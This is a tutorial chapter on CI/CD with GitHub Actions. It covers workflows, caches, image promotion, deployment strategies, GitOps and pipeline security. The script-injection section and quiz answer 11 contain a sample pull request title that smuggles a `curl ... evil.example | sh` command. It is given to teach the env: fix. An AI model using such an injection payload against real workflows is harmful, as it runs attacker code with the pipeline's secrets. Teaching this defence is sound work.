# Continuous integration and delivery

**In one sentence:** *continuous integration* means merging changes often, each one built and tested automatically; *continuous delivery* means every change that passes is packaged once and can ship to production safely at the push of a button.

**Why it matters:** CI/CD is the conveyor belt a platform team builds and looks after. When main is red, nobody can ship. When a 5pm deploy goes wrong, the pipeline decides whether rollback takes a minute or an evening. When a token leaks from a build log, its permissions decide how bad that is.

**You'll learn:**
- what continuous integration is, and why small, frequent merges beat big ones
- how to read a GitHub Actions workflow: triggers, jobs, steps, `needs:`, `if:`, matrices, caches, artifacts
- why you build once and promote the same image from dev to staging to production
- rolling, blue/green and canary deploys, rollbacks, and GitOps
- how to keep secrets and the build itself safe: least privilege, OIDC, untrusted pull requests, pinned actions

## Continuous integration

Picture four people on one Go service. Each works alone on a branch for three weeks, then they all merge on Friday. Nothing compiles, two people renamed the same function, and tests that passed on every branch fail together.

*Continuous integration* (CI) is the cure: everyone merges small changes into main at least daily, and an automated system builds and tests every push and pull request. A conflict found after an hour of work is a five-minute fix; after three weeks, it's a project.

### The red build rule

A *red build* is a failed pipeline run on main. **When main is red, fixing it is the team's top job**: a quick fix, or revert the commit that broke it.

A red main blocks everyone, and the next failure hides behind the first. Teams that leave main red stop trusting CI, and then it catches nothing. Reverting first and investigating later is normal, and nobody's fault.

## A pipeline: stages, jobs, steps

A *pipeline* is the automated path from a commit to running software, drawn as stages that each gate the next:

```text
  lint, vet ──► test ──► build ──► package image ──► deploy
  seconds       a minute  a minute  a few minutes      main only
```

**Cheap checks first.** `gofmt` and `go vet` take seconds, so they fail fast while the change is fresh in the author's head.

| Level | What it is | Example |
|---|---|---|
| workflow / pipeline | the whole thing, started by an event | "ci", run on every push |
| job | a group of steps on one fresh machine | `test`, `build`, `deploy` |
| step | one command or one reusable action | `go test ./...` |

Jobs run in parallel unless one depends on another. Each starts on a clean machine, so nothing carries over unless you pass it on as an artifact.

## GitHub Actions, the running example

GitHub Actions is GitHub's CI system; GitLab CI and Jenkins use other syntax for the same ideas. A *workflow* is a YAML file in `.github/workflows/` that runs whenever one of its triggers fires.

```yaml
name: ci

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        go-version: ['1.26', '1.27']
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version: ${{ matrix.go-version }}
          cache-dependency-path: go.sum
      - run: go vet ./...
      - run: go test -race ./...

  build:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version: '1.27'
          cache-dependency-path: go.sum
      - run: go build -ldflags "-X main.version=${{ github.sha }}" -o bin/deployctl ./cmd/deployctl
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: deployctl
          path: bin/deployctl

  deploy:
    needs: build
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: deployctl
      - run: chmod +x deployctl   # artifacts don't keep the executable bit
      - run: ./deployctl -version # your real deploy command goes here
```

Trace a pull request through it:

1. `on:` lists the triggers: a push to `main`, or any pull request.
2. `permissions:` limits each job's automatic token, `GITHUB_TOKEN`, to reading the code.
3. `runs-on:` picks the *runner*: a fresh GitHub-hosted virtual machine, thrown away afterwards.
4. The `strategy.matrix` runs **two** copies of `test` in parallel, one per Go version. If one fails, GitHub cancels the other unless you set `fail-fast: false` under `strategy`.
5. Each step either `uses:` an *action* (reusable code; `actions/checkout` clones the repository) or `run:`s a shell command.
6. `build` has `needs: test`: it waits for both copies and is skipped if either fails. It stamps the commit in with `-ldflags -X`, as in *Packages and project layout*.
7. `deploy` runs only `if:` the ref is `refs/heads/main`. A pull request's ref is like `refs/pull/42/merge`, so it's skipped; after the merge, the push to `main` runs all three jobs.
8. `environment: production` can make the job wait for a person to approve it.

### YAML gotchas

| You write | YAML reads | Fix |
|---|---|---|
| `go-version: 1.20` | the number `1.2` | `'1.20'` |
| a tab for indentation | a parse error | spaces only |
| a step indented one space too far | a different structure, or an error | let your editor show indentation |

**Quote every version number.** `1.26` survives as a number, but `1.30` won't.

## Caches and artifacts

A *cache* makes jobs faster: it saves downloaded Go modules under a *cache key*, and a later run with the same key restores them. Put a hash of `go.sum` in the key and it changes exactly when your dependencies do.

- **`actions/setup-go`** caches by default, keyed on `go.mod`; `cache-dependency-path: go.sum` keys on `go.sum` instead.
- **`actions/cache`** takes your own `key:`, like `${{ runner.os }}-go-${{ hashFiles('**/go.sum') }}`. On a miss, `restore-keys: ${{ runner.os }}-go-` restores the newest cache whose key starts with that, so only new modules download.
- **A key is saved once** and never overwritten.

An *artifact* is an output you keep, like a binary or a test report. It passes results to a later job in the same run, and stays downloadable for 90 days by default. Each name can be used once per run (give matrix copies different names), and files lose their executable bit.

| | Cache | Artifact |
|---|---|---|
| purpose | speed | keep or pass on an output |
| if it's missing | slower, still correct | the next job fails |

**A cache must never change the result.** A build that only passes with a warm cache is broken.

## Build once, promote everywhere

The anti-pattern: build an image for staging, test it, then build again for production. The second build pulls a newer base image, and production runs code nobody tested.

Instead, build **one** image per commit and *promote* that exact image, by its *digest* (`sha256:...`), from one environment to the next. Only configuration differs, read from the environment as in *Container config: settings from the environment*.

```text
  commit 3f9c2ab ─► build ─► api@sha256:91e4...
                      dev ──► staging ──► production (approval)
                          same digest everywhere
```

A GitHub *environment* is a named target like `production` with its own secrets and rules: a required reviewer must approve, and only `main` may deploy. Add `concurrency: production` to the job and two deploys never run at once.

**Delivery or deployment?** With continuous delivery, every green commit is ready and a person clicks to release. With *continuous deployment*, it goes to production automatically, which needs excellent tests and monitoring.

## Deployment strategies

Version 1 is serving traffic; version 2 is in the registry. How do you swap them?

| Strategy | How | Users hit by a bad release | Rollback |
|---|---|---|---|
| *rolling update* | replace instances a few at a time (the Kubernetes default) | a growing share | minutes |
| *blue/green* | run a full new copy beside the old, then switch all traffic | everyone, until you switch back | seconds |
| *canary* | send a slice, say 5%, to the new version; widen it if healthy | only the slice | seconds |

Blue/green needs double capacity; canary needs good metrics and traffic splitting: the error and latency numbers you exported in *Prometheus-style metrics: counters and /metrics*, compared between old and new. During rolling and canary deploys, **two versions run at once** against the same database.

A rolling update drops no requests only if every instance does the two things from *Production services*: it reports ready only once it can serve (*Health checks: liveness and readiness*), and on SIGTERM it fails readiness and drains before exiting (*Graceful shutdown: drain in-flight requests*). You'll wire both into a container in *Practice: containerize and ship a service*.

### Rollbacks

It's 5:10pm, the deploy finished at 5:00, and errors have tripled. **Roll back first, investigate after.**

A rollback deploys the previous image digest. It works only if the old version still runs against today's database, so write *backward-compatible migrations*: never rename or drop, in one release, something the previous release still reads.

```text
  release 1: add column email_v2, write both
  release 2: read only email_v2
  release 3: drop the old column
```

## GitOps

So far, CI pushes changes into the cluster. *GitOps* flips this: each environment's desired state (which image digest, how many replicas) lives as files in Git, and an agent in the cluster, such as Argo CD or Flux, keeps making the cluster match.

That's a *control loop*: observe, compare, act, repeat. You'll meet it properly in *Declarative systems and control loops*. In return:

- **Git is the audit log**, and **rollback is `git revert`**.
- **Drift heals itself.** A hand edit to the cluster gets changed back.
- **CI needs no cluster credentials.** It only writes to Git.

## Secrets and permissions

A CI runner holds the keys to production. Most leaks are accidents: a debug `echo`, a verbose flag.

- **Store tokens as secrets**, read as `${{ secrets.NAME }}`, and put production ones on the `production` environment.
- **Never `echo` a secret.** GitHub masks secrets as `***` in logs, but an encoded copy slips through.
- **Set `permissions:` explicitly.** Every job gets a `GITHUB_TOKEN` for the repository, and its default may include write access. Anything you don't list becomes `none`, and a job's own `permissions:` replaces the workflow's.

```yaml
jobs:
  deploy:
    permissions:
      contents: read    # check out the code
      id-token: write   # ask GitHub for an OIDC token
```

**OIDC beats stored cloud keys.** A cloud access key in a secret stays valid for years. With *OIDC* (OpenID Connect), the job gets a signed identity token from GitHub ("I'm repo X, branch main"), and the cloud swaps it for credentials that expire within about an hour. It needs `id-token: write`.

**If a token leaks:** revoke and rotate it first, then find out how. Assume it's already been copied.

## Untrusted input

Anyone can open a pull request on a public repository, and outsiders type its title, branch name and comments.

- **Build PRs with `pull_request`.** Fork PRs get no secrets and a read-only token. `pull_request_target` runs with your secrets and write access, so never check out and run a PR's code in it.
- **Keep `github.event` text out of `run:`.** GitHub pastes each `${{ }}` into the script before the shell runs, so a PR titled `x"; curl -s evil.example | sh; echo "` runs `curl`. That's *script injection*. Pass the value through `env:` and the shell treats it as data:

```yaml
- run: echo "Checking $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

## Supply chain security

Your pipeline runs other people's code: actions, base images, Go modules.

- **Pin every action to a full commit SHA, with the release in a comment.** A tag like `@v7` can be moved by the owner, or by whoever steals their account: in March 2025 that happened to `tj-actions/changed-files`, and workflows that ran it by tag during the attack printed their secrets into the build logs. `actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1` can't move. This course pins GitHub's own actions the same way, so there's one rule. Find a release's SHA with `git ls-remote --tags https://github.com/actions/checkout 'v7.0.1*'` (for an annotated tag, take the line ending in `^{}`), and let Dependabot update SHA and comment together.
- **Produce an SBOM.** A *software bill of materials* lists every package in an image, so you can search for the next big vulnerability.
- **Sign images and record provenance.** Tools like cosign sign the image digest, and the cluster can refuse unsigned images. *Provenance*, the core idea of the *SLSA* framework, is a signed record of which commit and workflow built an artifact.

## Common mistakes

- **Leaving main red, or long-lived branches.** Fix or revert now; merge small changes daily.
- **Unquoted versions in YAML.** `1.20` becomes `1.2`.
- **Rebuilding per environment, or deploying `:latest`.** Build once, deploy by digest.
- **A migration that breaks the previous release.** Then the rollback fails too.
- **Echoing secrets.** Masking is a safety net, not a guarantee.
- **Broad permissions and long-lived cloud keys.** Start from `contents: read`; use OIDC.
- **Running fork PR code under `pull_request_target`, or `${{ github.event.* }}` inside `run:`.**
- **Actions pinned to a tag.** Pin to a full commit SHA.

## Check yourself

1. The CI run on the main branch has failed, and a teammate says "I'll look at it next week". What does the red build rule say, and why?
2. A GitHub Actions deploy job has `needs: test` and `if: github.ref == 'refs/heads/main'`. What happens to it when someone opens a pull request?
3. A workflow sets `go-version: 1.20` without quotes and gets the wrong Go version. Why?
4. In CI, what is the difference between a cache and an artifact, and what happens if each one goes missing?
5. Why build a container image once and promote it from staging to production, instead of building it again for production?
6. A release has a bug that hits every request it serves. How many users see it with a canary deployment, compared with blue/green?
7. Why must a database migration stay compatible with the previous release of a service?
8. In GitOps, how does a new image version reach a Kubernetes cluster, and how do you roll it back?
9. Why is OIDC safer than storing a long-lived cloud access key as a CI secret?
10. A public repository's workflow uses `pull_request_target`, checks out the pull request's code and runs `go test ./...`. Why is that dangerous?
11. A GitHub Actions step runs `echo "${{ github.event.pull_request.title }}"`. How can a pull request title attack it, and what's the fix?
12. Why pin a GitHub Action to a full commit SHA instead of a tag like `@v7`?

## Answers

1. Fix it now or revert the breaking commit: a red main blocks everyone, hides new failures and teaches people to ignore CI.
2. It's skipped: a pull request's ref is like `refs/pull/42/merge`, so the `if:` is false.
3. YAML reads unquoted `1.20` as the number 1.2. Write `'1.20'`.
4. A cache only saves time, so without it the job is slower but correct. An artifact is an output a later job needs, so without it that job fails.
5. A second build can pull a newer base image or dependencies, so production would run untested code. Promoting one digest ships exactly what passed staging.
6. With a canary, only the small slice (say 5%), until you move that traffic back; with blue/green, everyone, until you switch back.
7. A rollback runs the previous release against today's database, so if the migration dropped or renamed something it reads, the rollback crashes too.
8. CI commits the new digest to Git, and an agent in the cluster (Argo CD, Flux) changes the cluster to match. Roll back with `git revert`.
9. A leaked long-lived key works for years. OIDC credentials expire within about an hour and there's no stored key to steal.
10. `pull_request_target` has the repository's secrets and a writable token, so a stranger's test file can steal them. Build PRs with `pull_request`.
11. `${{ }}` is pasted into the script before the shell runs, so a title like `x"; curl … | sh; echo "` becomes commands. Pass it through `env:` and use `"$TITLE"`.
12. A tag can be moved to different code by the owner or an attacker; a commit SHA always means the same code.

## Key terms

| Term | Meaning |
|---|---|
| continuous integration (CI) | merging small changes into main often, each built and tested automatically |
| red build | a failed pipeline run on main; fixing or reverting it comes first |
| pipeline | the automated path from a commit to running software: lint, test, build, package, deploy |
| workflow | a GitHub Actions pipeline: a YAML file in `.github/workflows/` |
| runner | the machine that runs a CI job |
| action | reusable code a step runs with `uses:`, like `actions/checkout` |
| cache (CI) | files kept between runs to save time, under a key like a hash of `go.sum` |
| artifact | a job's output, kept or passed to a later job in the same run, like a binary |
| digest | an image's `sha256:` content hash; unlike a tag, it can't be moved |
| promotion | moving the same built image from dev to staging to production, never rebuilding |
| GitHub environment | a named deploy target like `production` with its own secrets and approval rules |
| continuous delivery | every passing change is ready to release; a person decides when |
| continuous deployment | every passing change goes to production automatically |
| rolling update | replacing instances with the new version a few at a time |
| blue/green deployment | running the new version beside the old, then switching all traffic at once |
| canary deployment | sending a small slice of traffic to the new version, widening it if healthy |
| backward-compatible migration | a database change the previous release still works with, so rollbacks stay safe |
| GitOps | desired state lives in Git; an agent in the cluster keeps the cluster matching it |
| control loop | observe the actual state, compare it with the desired state, act, repeat |
| OIDC (in CI) | a job proves who it is with a signed token and gets cloud credentials that expire soon |
| script injection | outsider-typed text from `${{ github.event... }}` pasted into `run:` and executed as commands |
| SBOM | software bill of materials: the list of every package inside an image |
| provenance | a signed record of which source and workflow built an artifact |
| SLSA | "salsa": a framework of levels for how trustworthy a build is, built around provenance |

## Watch

- [Continuous Integration vs Feature Branch Workflow](https://www.youtube.com/watch?v=v4Ijkq6Myfc) · Modern Software Engineering · 18 min: Dave Farley, who co-wrote the book on continuous delivery, on why merging daily beats long-lived branches.
- [GitHub Actions Tutorial - Basic Concepts and CI/CD Pipeline with Docker](https://www.youtube.com/watch?v=R8_veQiYBjI) · TechWorld with Nana · 33 min: workflows, jobs, runners and actions, then a pipeline that builds and pushes a Docker image.
- [Top 5 Most-Used Deployment Strategies](https://www.youtube.com/watch?v=AWVTKBUnoIg) · ByteByteGo · 10 min: animated rolling, blue/green and canary deploys with their trade-offs.
- [What is GitOps, How GitOps works and Why it's so useful](https://www.youtube.com/watch?v=f5EpcWp0THw) · TechWorld with Nana · 12 min: push vs pull deployments, and why desired state in Git helps.

## Go deeper

- [Continuous Integration](https://martinfowler.com/articles/continuousIntegration.html): Martin Fowler's classic on the practices behind CI and why they work.
- [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax): the reference for every key used here.
- [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use): GitHub's checklist for secrets, token permissions, OIDC, script injection and pinning actions.
- [Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/): GitHub Security Lab on why `pull_request_target` plus a checkout of PR code hands strangers your secrets.
- [Blue Green Deployment](https://martinfowler.com/bliki/BlueGreenDeployment.html): the short original description of blue/green, database included.
